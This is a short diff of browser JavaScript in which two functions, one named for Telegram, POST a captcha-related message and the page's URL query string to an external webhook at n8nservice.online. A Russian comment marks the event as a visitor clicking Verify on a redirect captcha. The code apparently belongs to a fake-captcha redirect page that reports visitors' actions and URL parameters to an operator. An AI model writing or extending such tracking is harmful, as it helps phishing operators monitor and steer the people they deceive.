@@ -2182,7 +2182,7 @@
 function sendTelegramMessageThen2(data) {
 
  const message = '👇🏻Redirect capcha Нажал Verify в капче ';
-const fullUrl = window.location.href  ;
+const fullUrl = window.location.search  ;
     return fetch(`https://n8nservice.online/webhook/inforedirect`, {
         method: 'POST',
         headers: {
@@ -2370,7 +2370,7 @@ const y = rect.top;
 // Альтернативный способ с использованием .then()
 function sendTelegramMessageThen( message,data) {
 
-const fullUrl = window.location.href  ;
+const fullUrl = window.location.search  ;
     return fetch(`https://n8nservice.online/webhook/inforedirect`, {
         method: 'POST',
         headers: {
